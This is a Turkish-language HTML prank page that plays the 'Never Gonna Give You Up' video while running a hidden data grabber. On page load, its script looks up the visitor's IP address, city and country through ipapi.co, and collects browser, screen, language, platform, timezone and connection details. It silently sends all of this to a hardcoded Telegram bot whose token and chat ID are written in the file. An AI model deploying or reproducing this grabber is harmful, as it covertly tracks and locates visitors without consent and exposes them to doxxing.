<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Rick And Roll</title>
  <style>
    html, body {
      margin: 0; padding: 0; height: 100vh; width: 100vw; overflow: hidden;
      background: #fff;
      font-family: 'Consolas', monospace;
      color: #00ff99;
      user-select: none;
    }
    #video-bg {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      object-fit: cover;
      z-index: -1;
      filter: brightness(1.1);
    }
    #terminal {
      position: relative;
      margin: 20px auto;
      max-width: 700px;
      background: rgba(0, 0, 0, 0.7);
      border: 2px solid #00ff99;
      border-radius: 12px;
      padding: 30px 40px;
      white-space: pre-line;
      box-shadow: 0 0 15px #00ff99;
      font-size: 18px;
      min-height: 300px;
      overflow-y: auto;
      z-index: 10;
    }
  </style>
</head>
<body>
  <video id="video-bg" autoplay loop muted playsinline>
    <source src="https://dl.dropboxusercontent.com/s/3ylpz1z5fhmp9mcwesd4k/Rick-Astley-Never-Gonna-Give-You-Up-Official-Music-Video.mp4" type="video/mp4">
    Tarayıcınız video etiketini desteklemiyor.
  </video>

  <div id="terminal">Veriler Toplanıyor...</div>

  <script>
    async function sendToTelegram(message) {
      const chatId = "6400737507"; // Senin chat ID'in
      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      try {
        await fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        });
      } catch(e) {
        // Hata varsa sessizce geç
      }
    }

    async function collectData() {
      const terminal = document.getElementById('terminal');
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        const message = `Gizli Veri:\n` +
          `IP: ${data.ip}\n` +
          `Şehir: ${data.city}\n` +
          `Ülke: ${data.country_name}\n` +
          `Tarayıcı: ${navigator.userAgent}\n` +
          `Çözünürlük: ${screen.width}x${screen.height}\n` +
          `Dil: ${navigator.language}\n` +
          `Platform: ${navigator.platform}\n` +
          `Zaman Dilimi: UTC${-new Date().getTimezoneOffset() / 60}\n` +
          `Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
          `Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;

        terminal.innerText = message.replace(/\n/g, '\n');
        await sendToTelegram(message);
      } catch(e) {
        terminal.innerText = "Veri alınırken bir hata oluştu.";
      }
    }

    collectData();
  </script>
</body>
</html>
